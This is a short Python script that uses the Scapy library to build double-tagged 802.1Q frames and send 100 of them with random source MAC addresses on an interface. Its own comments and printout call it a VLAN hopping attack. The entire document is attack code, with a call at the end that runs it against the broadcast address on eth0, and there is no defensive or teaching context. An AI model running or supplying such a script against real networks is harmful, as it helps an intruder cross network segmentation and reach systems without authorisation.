from scapy.all import *
from scapy.layers.l2 import Dot1Q, Ether

def vlan_hopping_attack(target_mac, iface):
    # Create a double-tagged 802.1Q frame to exploit VLAN hopping
    frame = Ether(src=RandMAC(), dst=target_mac) / \
            Dot1Q(vlan=10) / \
            Dot1Q(vlan=20) / \
            IP(dst="192.168.1.1")

    # Send the packet to the interface
    sendp(frame, iface=iface, count=100, inter=0.1)
    print(f"VLAN hopping attack launched on interface {iface}")

vlan_hopping_attack("ff:ff:ff:ff:ff:ff", "eth0")
